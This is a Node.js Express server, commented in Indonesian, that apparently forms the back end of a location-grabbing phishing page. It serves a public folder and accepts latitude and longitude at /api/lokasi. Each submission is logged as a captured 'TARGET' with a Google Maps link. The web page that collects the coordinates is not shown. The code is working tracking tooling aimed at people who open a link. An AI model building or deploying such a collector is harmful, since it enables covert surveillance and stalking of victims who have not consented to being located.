const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware untuk membaca JSON
app.use(express.json());

// Sajikan file statis dari folder public
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint untuk menerima data lokasi dari web
app.post('/api/lokasi', (req, res) => {
    const { latitude, longitude } = req.body;
    
    console.log(`\n========================================`);
    console.log(`[+] TARGET LOKASI DITERIMA!`);
    console.log(`[+] Latitude  : ${latitude}`);
    console.log(`[+] Longitude : ${longitude}`);
    console.log(`[+] Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`);
    console.log(`========================================\n`);

    res.status(200).json({ status: 'success', message: 'Lokasi berhasil direkam' });
});

app.listen(PORT, () => {
    console.log(`Server berjalan di port ${PORT}`);
});
